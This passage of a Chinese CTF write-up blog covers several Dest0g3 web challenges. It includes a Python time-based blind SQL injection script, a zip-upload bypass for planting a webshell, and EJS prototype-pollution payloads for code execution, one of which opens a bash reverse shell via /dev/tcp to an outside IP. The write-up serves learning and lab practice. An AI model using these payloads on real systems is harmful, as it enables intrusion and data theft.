<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">f&quot;http://127.0.0.1//Less-5/?id=1&#x27;&quot;</span></span><br><span class="line">string = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,&#123;&#125;-&#x27;</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        time.sleep(<span class="number">1</span>) <span class="comment">#从右边开始一次一个字符，相等(benchmark(2999999,md5(&#x27;test&#x27;)))，否则就是0，这样就达到了时间盲注的效果</span></span><br><span class="line">        <span class="comment">#payload = f&quot;username=&#x27;or(if((ascii(right((select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),&#123;i&#125;))=&#x27;&#123;j&#125;&#x27;),(benchmark(2999999,md5(&#x27;test&#x27;))),0))or&#x27;&amp;password=a&amp;submit=&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;username=&#x27;or(if((ascii(right((select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&#x27;ctf&#x27;),&#123;i&#125;))=&#x27;&#123;j&#125;&#x27;),(benchmark(2999999,md5(&#x27;test&#x27;))),0))or&#x27;&amp;password=a&amp;submit=&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;username=&#x27;or(if((ascii(right((select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#x27;flaggg&#x27;),&#123;i&#125;))=&#x27;&#123;j&#125;&#x27;),(benchmark(2999999,md5(&#x27;test&#x27;))),0))or&#x27;&amp;password=a&amp;submit=&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;username=&#x27;or(if((ascii(right((select%a0group_concat(cmd)%a0from%a0ctf.flaggg),<span class="subst">&#123;i&#125;</span>))=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),(benchmark(2999999,md5(&#x27;test&#x27;))),0))or&#x27;&amp;password=a&amp;submit=&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">            requests.post(url=<span class="string">&quot;http://17fa2a25-fc60-4e0b-937b-18edcec93870.node4.buuoj.cn:81/index.php&quot;</span>, data=payload, headers=headers, timeout=<span class="number">1.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            res = <span class="built_in">chr</span>(j)+res</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#f&quot;&quot; 格式化字符串</span></span><br></pre></td></tr></table></figure>

<p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>

<p>BENCHMARK会重复计算<em><strong>expr</strong></em>表达式count次，通过这种方式就可以评估出mysql执行这个<em><strong>expr</strong></em>表达式的效率。这个函数的返回值始终是0，但可以根据客户端提示的执行时间来得到BENCHMARK总共执行的所消耗的时间</p>
<p>经过大量时间得到flag</p>
<p>Dest0g3{4989ce7c-2b8f-4dT7-9e1c-be8f732160c2}</p>
<h3 id="Really-Easy-SQL"><a href="#Really-Easy-SQL" class="headerlink" title="Really Easy SQL"></a>Really Easy SQL</h3><p>也可以用上面的方法得出flag。</p>
<h3 id="ezip"><a href="#ezip" class="headerlink" title="ezip"></a>ezip</h3><p>图片后有源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">upload.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;zip.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;..&quot;</span>)||strstr(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>; <span class="comment">//如果是，返回该字符串及后面剩余部分,文件名有..或/直接过滤</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pathinfo(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)!=<span class="string">&quot;zip&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;only zip!!&quot;</span>; <span class="comment">//只能zip文件</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$Myzip</span> = <span class="keyword">new</span> zip(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    mkdir(<span class="variable">$Myzip</span>-&gt;path);</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span>.<span class="variable">$Myzip</span>-&gt;path.<span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to unzip your zip to /&quot;</span>.<span class="variable">$Myzip</span>-&gt;path.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$Myzip</span>-&gt;unzip())&#123;<span class="keyword">echo</span> <span class="string">&quot;Success&quot;</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;failed&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">zip.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zip_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zip_manager</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$zip_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zip_manager = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path = <span class="keyword">$this</span>-&gt;gen_path();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zip_name = <span class="variable">$zip_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">gen_path</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$chars</span>=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        <span class="variable">$newchars</span>=str_split(<span class="variable">$chars</span>);</span><br><span class="line">        shuffle(<span class="variable">$newchars</span>);</span><br><span class="line">        <span class="variable">$chars_key</span>=array_rand(<span class="variable">$newchars</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="variable">$fnstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">15</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$fnstr</span>.=<span class="variable">$newchars</span>[<span class="variable">$chars_key</span>[<span class="variable">$i</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> md5(<span class="variable">$fnstr</span>.time().microtime()*<span class="number">100000</span>);  <span class="comment">//随机文件夹</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deldir</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//先删除目录下的文件：</span></span><br><span class="line">        <span class="variable">$dh</span> = opendir(<span class="variable">$dir</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$file</span> = readdir(<span class="variable">$dh</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span>!=<span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                <span class="variable">$fullpath</span> = <span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">                <span class="keyword">if</span>(!is_dir(<span class="variable">$fullpath</span>)) &#123;</span><br><span class="line">                    unlink(<span class="variable">$fullpath</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;deldir(<span class="variable">$fullpath</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        closedir(<span class="variable">$dh</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dir_list</span>(<span class="params"><span class="variable">$directory</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = [];</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$dir</span> = dir(<span class="variable">$directory</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$file</span> = <span class="variable">$dir</span>-&gt;read()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> !== <span class="string">&#x27;..&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$array</span>[] = <span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unzip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fullpath</span> = <span class="string">&quot;/var/www/html/&quot;</span>.<span class="keyword">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="keyword">$this</span>-&gt;zip_name;</span><br><span class="line">        <span class="variable">$white_list</span> = [<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zip_manager-&gt;open(<span class="variable">$fullpath</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="keyword">$this</span>-&gt;zip_manager-&gt;count();<span class="variable">$i</span> ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(<span class="keyword">$this</span>-&gt;zip_manager-&gt;getNameIndex(<span class="variable">$i</span>),<span class="string">&quot;../&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you bad bad&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;zip_manager-&gt;extractTo(<span class="keyword">$this</span>-&gt;path))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Unzip to /&quot;</span>.<span class="keyword">$this</span>-&gt;path.<span class="string">&quot;/ failed&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        @unlink(<span class="variable">$fullpath</span>);</span><br><span class="line">        <span class="variable">$file_list</span> = <span class="keyword">$this</span>-&gt;dir_list(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="keyword">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;sizeof(<span class="variable">$file_list</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="keyword">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;dir? I deleted all things in it&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;@<span class="keyword">$this</span>-&gt;deldir(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="keyword">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]);@rmdir(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="keyword">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo(<span class="variable">$file_list</span>[<span class="variable">$i</span>], PATHINFO_EXTENSION),<span class="variable">$white_list</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;only image!!! I deleted it for you&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;@unlink(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="keyword">$this</span>-&gt;path.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_list</span>[<span class="variable">$i</span>]);&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将文件名1和一句话木马压缩到zip文件夹中，使用压缩工具将文件名为1的改名为中文名，上传发现上传失败，就是要让它报错</p>
<p>直接用蚁剑连接，但是根目录flag没权限读取，使用nl  /flag即可读取flag。</p>
<h6 id="nl命令在linux系统中用来计算文件中行号。nl-可以将输出的文件内容自动的加上行号！其默认的结果与-cat-n-有点不太一样，-nl-可以将行号做比较多的显示设计，包括位数与是否自动补齐-0-等等的功能。"><a href="#nl命令在linux系统中用来计算文件中行号。nl-可以将输出的文件内容自动的加上行号！其默认的结果与-cat-n-有点不太一样，-nl-可以将行号做比较多的显示设计，包括位数与是否自动补齐-0-等等的功能。" class="headerlink" title="nl命令在linux系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。"></a>nl命令在<a target="_blank" rel="noopener" href="http://codex.wordpress.org.cn/Linux">linux</a>系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。</h6><h3 id="NodeSoEasy"><a href="#NodeSoEasy" class="headerlink" title="NodeSoEasy"></a>NodeSoEasy</h3><p>附件内容</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> merge= <span class="function">(<span class="params">target, source</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123; <span class="comment">//关键代码</span></span><br><span class="line">    <span class="keyword">var</span> target = &#123;&#125;</span><br><span class="line">    <span class="keyword">var</span> source = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.body))</span><br><span class="line">    merge(target, source)</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ttp@fx&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;private&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;node ./bin/www&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ejs&quot;</span>: <span class="string">&quot;3.1.7&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;4.18.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;body-parser&quot;</span>: <span class="string">&quot;1.20.0&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原型链污染配合ejs模板引擎实现rce，但是因为ejs版本3.1.7，修复了opts.outputFunctionName处的漏洞：</p>
<p>node_modules/ejs/ejs.js</p>
<p>调试一下payload，发现只要一层<code>__proto__</code>就可以污染到escapeFunction</p>
<p>Ejs模板引擎的原型链污染</p>
<p>payload1:</p>
<p>请求头加上Content-Type: application/json 并修改请求方式post</p>
<p>使用了一次就不能用第二次了</p>
<p>post提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);&quot;,&quot;compileDebug&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:true,&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/192.168.224.128/8899 0&gt;&amp;1\&quot;&#x27;);&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>学习网址：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236354">关于nodejs的ejs和jade模板引擎的原型链污染挖掘 - 安全客，安全资讯平台 (anquanke.com)</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/ctf%E7%A7%80%E5%B9%B3%E5%8F%B0/" rel="tag"># ctf秀平台</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/" rel="prev" title="ctf早期入门笔记">
      <i class="fa fa-chevron-left"></i> ctf早期入门笔记
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/06/29/2022ACTF/" rel="next" title="2022ACTF">
      2022ACTF <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Welcome-to-fxxking-DestCTF"><span class="nav-number">1.1.</span> <span class="nav-text">Welcome to fxxking DestCTF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pngenius"><span class="nav-number">1.2.</span> <span class="nav-text">Pngenius</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EasyEncode"><span class="nav-number">1.3.</span> <span class="nav-text">EasyEncode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%A0%E7%9F%A5%E9%81%93js%E5%90%97"><span class="nav-number">1.4.</span> <span class="nav-text">你知道js吗</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CRYPTO"><span class="nav-number">2.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#babyRSA"><span class="nav-number">2.1.</span> <span class="nav-text">babyRSA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#babyAES"><span class="nav-number">2.2.</span> <span class="nav-text">babyAES</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezDLP"><span class="nav-number">2.3.</span> <span class="nav-text">ezDLP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB"><span class="nav-number">3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phpdest"><span class="nav-number">3.1.</span> <span class="nav-text">phpdest</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EasyPHP"><span class="nav-number">3.2.</span> <span class="nav-text">EasyPHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SimpleRCE"><span class="nav-number">3.3.</span> <span class="nav-text">SimpleRCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#funny-upload-%E8%BF%99%E9%81%93%E9%A2%98%E5%87%BA%E7%9A%84%E7%89%B9%E5%88%AB%E5%A5%BD%EF%BC%88%E7%BB%95%E8%BF%87disable-functions%EF%BC%89"><span class="nav-number">3.4.</span> <span class="nav-text">funny_upload 这道题出的特别好（绕过disable_functions）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#REVERSE"><span class="nav-number">4.</span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#simpleXOR"><span class="nav-number">4.1.</span> <span class="nav-text">simpleXOR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hi"><span class="nav-number">4.2.</span> <span 